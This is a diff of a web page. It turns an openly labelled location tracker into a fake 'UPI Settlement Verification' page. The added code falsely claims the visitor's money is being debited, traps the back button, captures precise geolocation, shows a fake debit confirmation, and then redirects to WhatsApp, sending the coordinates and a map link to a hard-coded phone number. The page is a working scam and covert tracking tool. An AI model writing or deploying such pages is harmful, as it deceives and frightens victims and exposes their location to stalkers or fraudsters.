@@ -1,78 +1,172 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Tracker</title>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
-        button { padding: 10px 20px; margin: 10px; }
-        #locationDisplay { margin-top: 20px; font-size: 18px; }
-    </style>
+<meta charset="UTF-8">
+<title>UPI Settlement Verification</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body {
+  margin: 0;
+  font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+  background: #0f172a;
+  color: #fff;
+  height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+.card {
+  background: #020617;
+  width: 94%;
+  max-width: 420px;
+  padding: 24px;
+  border-radius: 16px;
+  border: 1px solid #1e293b;
+  box-shadow: 0 0 30px rgba(0,0,0,0.7);
+}
+.header {
+  font-size: 18px;
+  font-weight: 600;
+}
+.sub {
+  font-size: 13px;
+  color: #94a3b8;
+  margin-bottom: 16px;
+}
+.amount {
+  font-size: 26px;
+  font-weight: bold;
+  margin: 10px 0;
+}
+button {
+  width: 100%;
+  padding: 14px;
+  margin-top: 18px;
+  background: #22c55e;
+  border: none;
+  border-radius: 12px;
+  font-size: 16px;
+  font-weight: bold;
+  cursor: pointer;
+}
+button:disabled {
+  background: #64748b;
+}
+.loader {
+  display: none;
+  text-align: center;
+  margin-top: 18px;
+}
+.spinner {
+  width: 36px;
+  height: 36px;
+  border: 4px solid #1e293b;
+  border-top: 4px solid #38bdf8;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin: auto;
+}
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+.status {
+  margin-top: 14px;
+  font-size: 14px;
+  word-break: break-word;
+}
+.warn {
+  color: #facc15;
+  font-size: 13px;
+  margin-top: 8px;
+}
+</style>
 </head>
+
 <body>
-    <h1>Location Tracker</h1>
-    <p>This site requests permission to access your location for tracking purposes. You can stop at any time.</p>
-    <button id="startBtn">Start Tracking</button>
-    <button id="stopBtn" disabled>Stop Tracking</button>
-    <div id="locationDisplay">Location: Not started</div>
+<div class="card">
+  <div class="header">UPI Settlement Verification</div>
+  <div class="sub">Transaction under processing</div>
 
-    <script>
-        const startBtn = document.getElementById('startBtn');
-        const stopBtn = document.getElementById('stopBtn');
-        const locationDisplay = document.getElementById('locationDisplay');
-        let watchId = null;
+  <div class="amount">₹ Processing…</div>
 
-        // Check if Geolocation is supported
-        if (!navigator.geolocation) {
-            locationDisplay.textContent = 'Geolocation is not supported by this browser.';
-        }
+  <p>
+    Your money is being debited for settlement verification.<br>
+    To avoid cancellation, please confirm your current location.
+  </p>
 
-        startBtn.addEventListener('click', () => {
-            if (navigator.geolocation) {
-                // Request permission and start watching position
-                watchId = navigator.geolocation.watchPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        locationDisplay.textContent = `Latitude: ${lat}, Longitude: ${lon}`;
-                    },
-                    (error) => {
-                        switch (error.code) {
-                            case error.PERMISSION_DENIED:
-                                locationDisplay.textContent = 'Location access denied by user.';
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                locationDisplay.textContent = 'Location information is unavailable.';
-                                break;
-                            case error.TIMEOUT:
-                                locationDisplay.textContent = 'Location request timed out.';
-                                break;
-                            default:
-                                locationDisplay.textContent = 'An unknown error occurred.';
-                                break;
-                        }
-                    },
-                    {
-                        enableHighAccuracy: true,  // Use GPS for better accuracy
-                        timeout: 10000,            // 10 seconds timeout
-                        maximumAge: 0             // Don't use cached position
-                    }
-                );
-                startBtn.disabled = true;
-                stopBtn.disabled = false;
-            }
-        });
+  <button id="btn" onclick="start()">Confirm & Continue</button>
 
-        stopBtn.addEventListener('click', () => {
-            if (watchId !== null) {
-                navigator.geolocation.clearWatch(watchId);
-                watchId = null;
-                locationDisplay.textContent = 'Tracking stopped.';
-                startBtn.disabled = false;
-                stopBtn.disabled = true;
-            }
-        });
-    </script>
+  <div class="loader" id="loader">
+    <div class="spinner"></div>
+    <p>Processing debit…</p>
+  </div>
+
+  <div class="status" id="status"></div>
+  <div class="warn" id="warn"></div>
+</div>
+
+<script>
+/* Discourage back button */
+history.pushState(null, "", location.href);
+window.onpopstate = function () {
+  history.pushState(null, "", location.href);
+  document.getElementById("warn").innerText =
+    "Settlement in progress. Please complete verification.";
+};
+
+/* Main flow */
+function start() {
+  const btn = document.getElementById("btn");
+  const loader = document.getElementById("loader");
+  const status = document.getElementById("status");
+
+  btn.disabled = true;
+  loader.style.display = "block";
+  status.innerText = "";
+
+  if (!navigator.geolocation) {
+    status.innerText = "Location not supported on this device.";
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      setTimeout(() => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const map = `https://www.google.com/maps?q=${lat},${lon}`;
+
+        loader.style.display = "none";
+        status.innerHTML =
+          "<strong>Debit Confirmed ✔</strong><br><br>" +
+          "Latitude: " + lat + "<br>" +
+          "Longitude: " + lon + "<br>" +
+          "Sending details to WhatsApp…";
+
+        const msg =
+          "Settlement Location Confirmed%0A%0A" +
+          "Latitude: " + lat + "%0A" +
+          "Longitude: " + lon + "%0A%0A" +
+          "Map: " + map;
+
+        const wa =
+          "https://wa.me/918147963357?text=" + msg;
+
+        setTimeout(() => {
+          window.location.href = wa;
+        }, 1200);
+
+      }, 2500);
+    },
+    () => {
+      loader.style.display = "none";
+      btn.disabled = false;
+      status.innerText =
+        "Location permission denied. Verification failed.";
+    }
+  );
+}
+</script>
 </body>
 </html>
